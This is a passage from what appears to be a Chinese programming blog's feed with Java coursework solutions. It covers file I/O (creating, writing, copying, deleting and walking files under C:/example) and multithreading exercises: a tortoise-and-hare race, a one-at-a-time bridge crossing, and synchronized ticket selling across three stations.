*/</span><br><span class="line">private static void walkDirectories(String dir) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">Path d = Paths.get(dir);</span><br><span class="line">Files.walk(d)</span><br><span class="line">//.sorted(Comparator.reverseOrder()) // 反向遍历</span><br><span class="line">.forEach(System.out::println);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedWriter;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.nio.file.FileAlreadyExistsException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.nio.file.StandardCopyOption;</span><br><span class="line">import java.util.Comparator;</span><br><span class="line"></span><br><span class="line">public class IOTest &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">        </span><br><span class="line">String fileName = <span class="string">&quot;C:/example/from.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----- 创建文件 ------&quot;</span>);</span><br><span class="line">        createFile(fileName);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----  将字符串写入文件 -------&quot;</span>);</span><br><span class="line">        // \r\n在txt文本中换行</span><br><span class="line">        String str =</span><br><span class="line">                <span class="string">&quot;白日依山尽\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;黄河入海流\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;欲穷千里目\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;更上一层楼\r\n&quot;</span>;</span><br><span class="line">        writeToFile(fileName, str);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;--------- 基于基本IO流实现文件的复制 ----------&quot;</span>);</span><br><span class="line">        String toFile = <span class="string">&quot;C:/example/to.txt&quot;</span>;</span><br><span class="line">        copyByIO(fileName, toFile);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;--------- 基于NIO实现文件的复制 ----------&quot;</span>);</span><br><span class="line">        String toFile2 = <span class="string">&quot;C:/example/nio/to.txt&quot;</span>;</span><br><span class="line">        copyByNIO(fileName, toFile2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------- 删除指定文件 -------------&quot;</span>);</span><br><span class="line">        deleteFile(toFile);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;---------- 遍历指定目录文件 -------------&quot;</span>);</span><br><span class="line">        String dir = <span class="string">&quot;C:/example&quot;</span>;</span><br><span class="line">        walkDirectories(dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 基于指定文件名称创建目录及文件</span><br><span class="line">     * 如果文件已经存在，则忽略</span><br><span class="line">     *</span><br><span class="line">     * @param fileName</span><br><span class="line">     * @throws IOException </span><br><span class="line">     */</span><br><span class="line">    private static void createFile(String fileName) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    Path dir = Paths.get(fileName);</span><br><span class="line">    Files.createDirectories(dir.getParent());// 创建目录，存在目录也不会抛出异常</span><br><span class="line">    try&#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    Files.createFile(dir);// 创建文件，若文件已经存在则会抛出异常</span><br><span class="line">    System.out.println(<span class="string">&quot;创建文件成功！文件位置：&quot;</span> + fileName);</span><br><span class="line">    &#125;</span><br><span class="line">    catch(FileAlreadyExistsException e) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    System.out.println(<span class="string">&quot;文件 &quot;</span> + fileName + <span class="string">&quot; 已存在，无需创建！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 提示：文件以字节操作，因此可以</span><br><span class="line">     * 字符串，转字节数组，直接基于Files写入文件</span><br><span class="line">     * </span><br><span class="line">     * (注：我是直接用的BufferedWriter，比较方便)</span><br><span class="line">     *</span><br><span class="line">     * @param fileName</span><br><span class="line">     * @param content</span><br><span class="line">     * @throws IOException </span><br><span class="line">     */</span><br><span class="line">    private static void writeToFile(String fileName, String content) throws IOException&#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    String[] lines = content.split(<span class="string">&quot;\r\n&quot;</span>); // 先把要写入的字符串按行分割</span><br><span class="line">    try( BufferedWriter output = new BufferedWriter(new FileWriter(fileName)); ) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (String line: lines) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    output.write(line); // 写入一行(不含换行符)</span><br><span class="line">    output.newLine(); // 写入换行符</span><br><span class="line">    &#125;</span><br><span class="line">    output.flush();</span><br><span class="line">    System.out.println(<span class="string">&quot;数据写入成功！文件位置：&quot;</span> + fileName);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 基于基本IO，以及字节数组缓冲区，复制文件</span><br><span class="line">     * 打印显示循环读写循环次数</span><br><span class="line">     *</span><br><span class="line">     * @param sourceFile</span><br><span class="line">     * @param targetFile</span><br><span class="line">     * @throws IOException </span><br><span class="line">     */</span><br><span class="line">    private static void copyByIO(String sourceFile, String targetFile) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    try( InputStream input = new FileInputStream(sourceFile);</span><br><span class="line">         OutputStream output = new FileOutputStream(targetFile); )&#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    int size = 4;</span><br><span class="line">    byte[] buffer = new byte[size]; // 字节数组缓冲区，大小为size</span><br><span class="line">    int len;</span><br><span class="line">    int cnt = 0;</span><br><span class="line">    <span class="keyword">while</span>( (len = input.read(buffer)) != -1) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    output.write(buffer, 0, len);</span><br><span class="line">    cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(sourceFile + <span class="string">&quot; -&gt; &quot;</span> + targetFile + <span class="string">&quot; 复制成功！&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;字节数组缓冲区大小为&quot;</span> + size + <span class="string">&quot;时，读写循环次数为&quot;</span> + cnt + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 基于NIO，实现文件的复制</span><br><span class="line">     *</span><br><span class="line">     * @param sourceFile</span><br><span class="line">     * @param targetFile</span><br><span class="line">     * @throws IOException </span><br><span class="line">     */</span><br><span class="line">    private static void copyByNIO(String sourceFile, String targetFile) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    Path <span class="built_in">source</span> = Paths.get(sourceFile);</span><br><span class="line">    Path target = Paths.get(targetFile);</span><br><span class="line">    Files.createDirectories(target.getParent());</span><br><span class="line">    Files.copy(<span class="built_in">source</span>, target, StandardCopyOption.REPLACE_EXISTING); // 如果输出文件存在，则替换</span><br><span class="line">    System.out.println(sourceFile + <span class="string">&quot; -&gt; &quot;</span> + targetFile + <span class="string">&quot; 复制成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 删除文件</span><br><span class="line">     *</span><br><span class="line">     * @param fileName</span><br><span class="line">     * @throws IOException </span><br><span class="line">     */</span><br><span class="line">    private static void deleteFile(String fileName) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    Path dir = Paths.get(fileName);</span><br><span class="line">    Files.deleteIfExists(dir);</span><br><span class="line">    System.out.println(fileName + <span class="string">&quot; 删除成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 遍历打印指定目录下全部目录/文件名称</span><br><span class="line">     *</span><br><span class="line">     * @param dir</span><br><span class="line">     * @throws IOException </span><br><span class="line">     */</span><br><span class="line">    private static void walkDirectories(String dir) throws IOException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    Path d = Paths.get(dir);</span><br><span class="line">    Files.walk(d)</span><br><span class="line">    //.sorted(Comparator.reverseOrder()) // 反向遍历</span><br><span class="line">    .forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java 多线程并发</title>
      <link href="/2021/12/31/Java-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%B9%B6%E5%8F%91/"/>
      <url>/2021/12/31/Java-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%B9%B6%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p>利用多线程技术编写一个模拟龟兔赛跑的程序，要求如下：<br>（1）乌龟每次跑一个单位，兔子每次跑10个单位；<br>（2）每个线程运行时，判断是否达到终点，如果到达终点，给出提示信息，<br>未到终点则提示目前距离终点的距离，并判断是否领先；<br>（3）如果兔子领先，则显示“我跑得快，睡一觉”信息，并睡一会。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">class Race implements Runnable &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">final int total = 100; // 赛道长度</span><br><span class="line">volatile boolean isOver = <span class="literal">false</span>; // 比赛结束标志</span><br><span class="line">volatile int disRabbit = 0; // 兔子已走距离</span><br><span class="line">volatile int disTortoise = 0; // 乌龟已走距离</span><br><span class="line">@Override</span><br><span class="line">public void <span class="function"><span class="title">run</span></span>() &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">for</span>(int time = 1; isOver != <span class="literal">true</span>; time++) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span>(Thread.currentThread().getName().equals(<span class="string">&quot;兔子&quot;</span>)) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">disRabbit = time * 10;</span><br><span class="line"><span class="keyword">if</span>(disRabbit &gt;= total) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">isOver = <span class="literal">true</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;兔子获胜！&quot;</span>);</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;兔子距终点&quot;</span> + (total - disRabbit) + <span class="string">&quot;米&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(disRabbit &gt; disTortoise) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">try &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">System.out.println(<span class="string">&quot;我跑得快，睡一觉\n&quot;</span>);</span><br><span class="line">Thread.sleep((long) (Math.random()*2)); </span><br><span class="line">// get a random number [0,1]</span><br><span class="line">&#125; catch (InterruptedException e) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">disTortoise = time;</span><br><span class="line"><span class="keyword">if</span>(disTortoise &gt;= total) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">isOver = <span class="literal">true</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;乌龟获胜！&quot;</span>);</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;乌龟距终点&quot;</span> + (total - disTortoise) + <span class="string">&quot;米&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">synchronized (this) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span>(!isOver) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span>(disRabbit &gt; disTortoise) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">System.out.println(<span class="string">&quot;兔子领先&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">System.out.println(<span class="string">&quot;乌龟领先&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Main &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">Race r = new Race();</span><br><span class="line">Thread t1 = new Thread(r, <span class="string">&quot;兔子&quot;</span>);</span><br><span class="line">Thread t2 = new Thread(r, <span class="string">&quot;乌龟&quot;</span>);</span><br><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写多线程应用程序，模拟多人过独木桥。<br>独木桥每次只能通过一个人，每个人通过木桥的时间为5秒，随机生成10个人，同时准备过此独木桥，<br>显示一下每次通过独木桥人的姓名。需要用到随机数。<br>注意：（1）在开始过桥时输出：开始过桥！过完桥后输出：已过桥！<br>（2）随机选人的时候，每个人都要选到，不能重复选。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Random;</span><br><span class="line">class SingleBridge implements Runnable &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">@Override</span><br><span class="line">public void <span class="function"><span class="title">run</span></span>() &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">synchronized(this) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">// synchronized(this)&#123;...&#125;保证一个进程执行该代码块内所有语句不会被其他进程打断</span><br><span class="line">System.out.println(Thread.currentThread().getName() + <span class="string">&quot; 开始过桥&quot;</span>);</span><br><span class="line">try &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">Thread.sleep(5000);</span><br><span class="line">&#125; catch (InterruptedException e) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(Thread.currentThread().getName() + <span class="string">&quot; 已过桥&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Main &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">static final int N = 10; // 人数</span><br><span class="line">public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">SingleBridge s = new SingleBridge();</span><br><span class="line">List&lt;Thread&gt; threads = new ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span>(int i = 0; i &lt; N; i++) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">threads.add(new Thread(s, <span class="string">&quot;name&quot;</span> + i));</span><br><span class="line">&#125;</span><br><span class="line">Random random = new Random();</span><br><span class="line"><span class="keyword">while</span>(threads.size() &gt; 0) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">int index = random.nextInt(threads.size()); </span><br><span class="line">// get a random number [0,size-1]</span><br><span class="line">threads.get(index).start();</span><br><span class="line">threads.remove(index);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哈尔滨火车站下面有三个火车票代售点：哈站、哈东站、哈西站，<br>假如哈尔滨到北京的火车票总共是200张，如何用程序来实现三个售票点同时卖票的功能。<br>注意：考虑线程同步问题，避免出现重复卖票问题。需要考虑同步问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">class TicketApp implements Runnable &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">volatile int ticket = 200; // 2000效果更明显 </span><br><span class="line">volatile boolean canSell = <span class="literal">true</span>;</span><br><span class="line">synchronized void <span class="function"><span class="title">sell</span></span>() &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">// 这里一定要加synchronized</span><br><span class="line">// 保证一个线程在执行sell方法的过程中不会被其他线程打断</span><br><span class="line"><span class="keyword">if</span>(ticket &gt; 0) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">ticket--;</span><br><span class="line">System.out.println(Thread.currentThread().getName() + <span class="string">&quot; 售出一张票，&quot;</span> </span><br><span class="line">+ <span class="string">&quot;现有余票&quot;</span> + ticket + <span class="string">&quot;张&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">canSell = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">@Override</span><br><span class="line">public void <span class="function"><span class="title">run</span></span>() &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span>(canSell) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">sell();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Main &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">TicketApp app = new TicketApp();</span><br><span class="line">Thread t1 = new Thread(app, <span class="string">&quot;哈站&quot;</span>);</span><br><span class="line">Thread t2 = new Thread(app, <span class="string">&quot;哈东站&quot;</span>);</span><br><span class="line">Thread t3 = new Thread(app, <span class="string">&quot;哈西站&quot;</span>);</span><br><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br><span class="line">t3.start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java 异常处理</title>
      <link href="/2021/12/31/Java-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
      <url>/2021/12/31/Java-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
      
